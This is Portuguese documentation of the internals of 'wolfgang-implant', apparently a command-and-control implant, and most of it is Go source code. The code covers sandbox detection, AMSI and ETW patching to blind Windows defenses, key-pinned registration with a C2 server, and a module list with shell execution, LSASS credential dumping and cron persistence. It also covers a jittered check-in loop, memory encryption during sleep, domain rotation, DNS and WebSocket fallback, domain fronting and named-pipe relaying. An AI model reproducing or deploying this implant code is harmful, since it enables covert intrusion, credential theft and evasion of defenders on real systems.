    Internos do Implant¶

    Esta pagina documenta o comportamento interno do wolfgang-implant — desde o momento em que o binario e executado no target ate o check-in loop estavel. Cada fase e documentada com o codigo fonte correspondente.

    Fase 1: Auto-Evasion¶

    A evasion chain roda antes de qualquer atividade de rede. Isso e critico — se o implant gera alertas antes de se registrar, o operador nunca tera controle.

    Sandbox Detection¶

    O sandbox check usa um sistema de pontuacao. Multiplos indicadores sao verificados, cada um contribuindo pontos. Se o score total excede o threshold (default 40), o implant aborta com os.Exit(0) — exit code zero para nao alertar monitoramento.

    Indicadores tipicos:

    • Contagem de CPUs (VMs geralmente tem 1-2)
    • Quantidade de RAM (sandboxes geralmente <4GB)
    • Presenca de processos de analise (procmon, wireshark, ida)
    • Resolucao de tela
    • Uptime do sistema (sandboxes reiniciam frequentemente)
    • Presenca de artefatos de VM (VMware Tools, VBox Guest Additions)

    AMSI e ETW Bypass (Windows)¶

    No Windows, o implant opcionalmente aplica patches em runtime:

    // cmd/implant/evasion_windows.go
func initEvasion(cfg *ImplantConfig) error {
    if cfg.AutoAMSI {
        bypass := evasion.NewAMSIBypass()
        args := module.ModuleArgs{Raw: `{"action":"patch","strategy":"auto"}`}
        bypass.Execute(ctx, args)
    }

    if cfg.AutoETW {
        bypass := evasion.NewETWBypass()
        args := module.ModuleArgs{Raw: `{"action":"patch","strategy":"auto"}`}
        bypass.Execute(ctx, args)
    }

    if cfg.AutoSandbox {
        runSandboxCheck(cfg)
    }
    return nil
}

    AMSI (Anti-Malware Scan Interface): Patched para evitar que comandos em memoria sejam escaneados pelo Windows Defender.

    ETW (Event Tracing for Windows): Patched para evitar que atividades do implant sejam logadas em ETW providers.

    Em plataformas nao-Windows, a evasion e no-op:

    // cmd/implant/evasion.go (build tag: !windows)
func initEvasion(cfg *ImplantConfig) error {
    if cfg.AutoSandbox {
        runSandboxCheck(cfg)
    }
    // AMSI/ETW nao existem em Linux/macOS
    return nil
}

    Fase 3: Registration com ECDH¶

    A registration e o handshake mais critico. O implant:

    1. Gera keypair efemero X25519
    2. Coleta sysinfo (hostname, OS, arch, username) usando funcoes platform-specific
    3. Envia POST /register com pubkey + metadata
    4. Verifica key pinning — se o server retorna uma pubkey diferente da embutida em build time, aborta
    5. Deriva session key via ECDH + HKDF
    6. Descarta chave privada efemera — forward secrecy
    // cmd/implant/register.go
func Register(cfg *ImplantConfig, httpClient *http.Client) (*AgentSession, error) {
    ephemeral, _ := crypto.GenerateEphemeralKeypair()

    req := registrationRequest{
        Hostname:  hostname,
        OS:        runtime.GOOS,
        Arch:      runtime.GOARCH,
        Username:  currentUsername(),
        PublicKey: hex.EncodeToString(ephemeral.Public.Bytes()),
        // ...
    }

    // POST /register
    resp := doHTTPPost(cfg.ServerURL+"/register", req)

    // Key pinning
    if cfg.ServerPublicKey != "" && regResp.ServerPublicKey != cfg.ServerPublicKey {
        return nil, fmt.Errorf("server public key mismatch")
    }

    // ECDH
    serverPub, _ := crypto.ParsePublicKey(serverPubBytes)
    sharedSecret, _ := crypto.DeriveSharedSecret(ephemeral.Private, serverPub)
    sessionKey, _ := crypto.DeriveSessionKey(sharedSecret, []byte(regResp.AgentID))

    // ephemeral.Private sai de escopo aqui = forward secrecy
    return &AgentSession{AgentID: regResp.AgentID, SessionKey: sessionKey}, nil
}

    Retries com Backoff¶

    Se a registration falha, o implant tenta ate 10 vezes com delay crescente:

    const (
    maxRegistrationAttempts = 10
    baseRegistrationDelay   = 2 * time.Second
    maxRegistrationJitter   = 3 * time.Second
)

for attempt := 1; attempt <= maxRegistrationAttempts; attempt++ {
    session, err = Register(cfg, client)
    if err == nil { break }
    jitter := time.Duration(rand.Int63n(int64(maxRegistrationJitter)))
    time.Sleep(baseRegistrationDelay + jitter)
}

    Fase 5: Module System¶

    O implant registra todos os modulos estaticos no boot. Modulos nao suportados pela plataforma sao silenciosamente ignorados:

    func registerAllModules(registry *module.Registry) {
    modules := []module.Module{
        &shell.ShellModule{},           // all platforms
        &shell.ExecModule{},            // all platforms
        &credential.LsassDumpModule{},  // Windows only — skip on Linux
        evasion.NewAMSIBypass(),        // Windows only
        persist.NewCronModule(tracker), // Linux only
        // ...
    }
    for _, m := range modules {
        registry.RegisterModule(m) // checks m.OS() vs runtime.GOOS
    }
}

    Bridge: Task -> Module -> Result¶

    O bridge conecta o sistema de tasks ao sistema de modulos:

    bridge := func(task taskDispatch) taskResult {
    args := module.ModuleArgs{Raw: task.Args}
    result, err := executor.Execute(ctx, task.Module, args)

    // Fallback: modulo nao encontrado no registry estatico
    if errors.Is(err, module.ErrModuleNotFound) && modLoader != nil {
        output, loadErr := modLoader.LoadAndExecute(ctx, task.Module, task.Args)
        if loadErr == nil {
            return taskResult{Status: "completed", Result: output}
        }
    }
    // ...
}

    Fase 7: Check-in Loop¶

    WaitBackoff --> Sleeping: Exponential backoff

    CheckInOK --> ResetCounters: RecordSuccess()

    HasTasks --> Sleeping: Nao

    Implementacao do Loop¶

    // cmd/implant/checkin.go
func CheckInLoop(ctx context.Context, cfg *ImplantConfig, session *AgentSession,
    recon *Reconnector, executor ModuleExecutor) error {

    var seq uint64 = uint64(recon.ResumeSeq())

    for {
        // Guarda contra exaustao de nonce
        if seq > math.MaxUint32 {
            return fmt.Errorf("crypto: sequence exhausted")
        }

        // 1. Seleciona transport ativo
        tr := recon.CurrentImplantTransport()

        // 2. Check-in
        tasks, err := tr.CheckIn(ctx, session, uint32(seq))
        if err != nil {
            if killErr := recon.RecordFailure(); killErr != nil {
                return killErr // kill switch triggered
            }
            recon.WaitBackoff(ctx) // exponential backoff
            continue
        }

        // 3. Sucesso — reset counters
        seq++
        recon.RecordSuccess(uint32(seq))

        // 4. Executa tasks
        for _, task := range tasks {
            result := executor(task)
            // Retry 3x com backoff 100ms, 200ms, 400ms
            for attempt := 0; attempt < 3; attempt++ {
                if sendErr := tr.SendResult(ctx, session, uint32(seq), result); sendErr == nil {
                    seq++
                    break
                }
                time.After(time.Duration(100<<uint(attempt)) * time.Millisecond)
            }
        }

        // 5. Sleep com jitter
        sleepDur := jitteredSleep(cfg.Sleep, cfg.Jitter)
        if cfg.SleepEncrypt {
            obfuscatedSleep(sleepDur) // cifra memoria durante sleep
        } else {
            time.Sleep(sleepDur)
        }
    }
}

    Jitter com Distribuicao Normal¶

    O jitter usa distribuicao Gaussiana (nao uniforme) para um padrao de timing mais natural:

    func jitteredSleep(baseMs int, jitterPct int) time.Duration {
    maxDeviation := float64(baseMs) * float64(jitterPct) / 100.0
    stddev := maxDeviation / 3.0 // 99.7% dentro de ±jitterPct%

    jittered := float64(baseMs) + rand.NormFloat64()*stddev

    // Clamp: [100ms, base + maxDeviation]
    jittered = math.Max(100.0, math.Min(jittered, float64(baseMs)+maxDeviation))
    return time.Duration(jittered) * time.Millisecond
}

    Por que Gaussian e nao uniforme? Distribuicao normal concentra a maioria dos valores perto do base interval, com desvios extremos sendo raros. Isso produz um padrao de timing mais realista que distribuicao uniforme.

    Sleep Encryption (Windows)¶

    No Windows, o implant pode cifrar sua propria memoria durante o sleep:

    // cmd/implant/evasion_windows.go
func platformObfuscatedSleep(dur time.Duration) {
    obf := evasion.DefaultSleepObfuscator()
    if err := obf.ObfuscatedSleep(dur); err != nil {
        time.Sleep(dur) // fallback
    }
}

    Isso dificulta memory scanning durante o periodo de idle. As regioes de modulos dinamicos carregados tambem sao incluidas no pass de cifragem via ModuleCache.Regions().

    Reconnector — Resiliencia de Comunicacao¶

    O Reconnector gerencia tres mecanismos de resiliencia:

    1. Domain Rotation¶

    Cada falha rota para a proxima callback URL:

    // Configuracao: CallbackURLs = ["https://c2-1.example.com", "https://c2-2.example.com"]
if len(r.urls) > 1 {
    r.currentURLIdx = (r.currentURLIdx + 1) % len(r.urls)
}

    2. Transport Fallback¶

    Apos N falhas consecutivas (default 10) no transport atual, troca para o proximo na chain:

    if r.consecutiveFailures >= r.maxTransportFailures() && chainLen > 1 {
    r.currentTransportIdx = (r.currentTransportIdx + 1) % chainLen
    r.consecutiveFailures = 0 // reset per-transport
}

    Exemplo: HTTPS falha 10 vezes -> troca para DNS -> DNS falha 10 vezes -> troca para WS -> ...

    3. Kill Switch¶

    Se o total de falhas (across all transports) excede o threshold (default 100), o implant termina:

    var ErrKillSwitch = errors.New("implant: kill switch triggered")

func (r *Reconnector) RecordFailure() error {
    r.totalFailures++
    if r.totalFailures >= r.maxTotalFailures() {
        return ErrKillSwitch
    }
    // ...
}

    O kill switch previne que um implant "preso" fique gerando trafego indefinidamente, o que poderia alertar defensores.

    Exponential Backoff¶

    func (r *Reconnector) BackoffDuration() time.Duration {
    base := float64(r.cfg.Sleep)
    exp := base * math.Pow(2, float64(r.consecutiveFailures))

    // Cap: max 5 minutos
    if exp > float64(r.maxBackoffMs()) { exp = float64(r.maxBackoffMs()) }

    // Jitter: ±25%
    jitterRange := exp * 0.25
    jittered := exp + (rand.Float64()*2-1)*jitterRange

    return time.Duration(math.Max(100, jittered)) * time.Millisecond
}

    Com sleep base de 5s e max backoff de 5min:

    Falhas Backoff base Com jitter
    0 5s 3.75-6.25s
    1 10s 7.5-12.5s
    2 20s 15-25s
    3 40s 30-50s
    4 80s 60-100s
    5 160s 120-200s
    6+ 300s (cap) 225-375s

    Configuracao Embutida (ldflags)¶

    Toda a configuracao do implant e embutida em build time. Nao existem arquivos de config em disco:

    // cmd/implant/config.go
var (
    buildServerPublicKey = "" // X25519 pubkey para key pinning
    buildServerURL       = "" // callback primario
    buildTransport       = "" // "https", "dns", "ws"
    buildSleep           = "" // intervalo de check-in (ms)
    buildJitter          = "" // porcentagem de jitter
    buildCallbackURLs    = "" // URLs extras (comma-separated)
    buildTransportPrio   = "" // prioridade de transports
    buildMaxTransFail    = "" // falhas antes de trocar transport
    buildMaxTotalFail    = "" // falhas antes de kill switch
    buildFrontingDomain  = "" // CDN domain para SNI
    buildActualHost      = "" // Host header para C2
    buildAutoAMSI        = "" // "true" para AMSI bypass automatico
    buildAutoETW         = "" // "true" para ETW bypass automatico
    buildAutoSandbox     = "" // "true" para sandbox detection
    buildSleepEncrypt    = "" // "true" para cifrar memoria no sleep
    buildDynamicModules  = "" // "true" para loading sob demanda
)

    O DefaultConfig() aplica esses overrides:

    func DefaultConfig() *ImplantConfig {
    cfg := &ImplantConfig{
        ServerURL: "https://127.0.0.1:8443",
        Transport: "https",
        Sleep:     5000,
        Jitter:    10,
        // ...
    }

    if buildServerPublicKey != "" { cfg.ServerPublicKey = buildServerPublicKey }
    if buildServerURL != ""       { cfg.ServerURL = buildServerURL }
    if buildAutoAMSI == "true"    { cfg.AutoAMSI = true }
    // ... etc
    return cfg
}

    Isso significa que cada implant gerado e unico — tem sua propria configuracao compilada. Nao ha "configuracao padrao" que possa ser extraida de um implant e aplicada a outro.

    Pipe Relay¶

    Quando PipeListener esta configurado, o implant inicia uma goroutine adicional que aceita conexoes de outros implants via Named Pipe:

    // cmd/implant/main.go
if cfg.PipeListener != "" {
    go startPipeRelay(ctx, cfg, session, client)
}

    O relay e transparente: envelopes dos child implants passam inalterados para o upstream transport do parent. Cada child tem sua propria session key com o server — o parent nao decifra nada.

    Cenario tipico:

    [Child Implant] --Named Pipe--> [Parent Implant] --HTTPS--> [Server]

    O child nao precisa de acesso externo. O parent atua como proxy puro.
